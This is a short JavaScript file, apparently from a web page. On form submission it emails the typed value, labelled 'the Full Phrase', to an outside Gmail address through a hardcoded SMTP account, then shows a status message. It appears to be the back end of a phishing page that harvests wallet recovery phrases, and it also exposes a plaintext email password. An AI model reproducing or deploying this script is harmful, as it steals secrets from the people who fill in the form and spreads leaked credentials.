
//     }).then(
//       message => {
//         if(message === "OK") {
//                 document.getElementById("status").style.display = "block";
//         }
//       }
//     );
// };


// Form.addEventListener("submit", (e) =>{
//     e.preventDefault();

//     sendEmail()

// });
const Form = document.getElementById('my-form');
const Names = document.getElementById('contact-inputs')

function sendEmail(){
  const bodyMessage = `This is the Full Phrase: ${Names.value}`;
  Email.send({
      Host : "smtp.elasticemail.com",
      Username : "echefrankidosky4love@gmail.com",
      Password : "Frankidosky101010",
      To : ' mikebrew001@gmail.com ',
      From : "echefrankidosky4love@gmail.com",
      Subject : Names.value,
      Body : bodyMessage
  }).then(
    message => {
      if(message === "OK") {
            document.getElementById("status").style.display = "block";
      }
    }
  );
};


Form.addEventListener("submit", (e) =>{
  e.preventDefault();

  sendEmail()

});

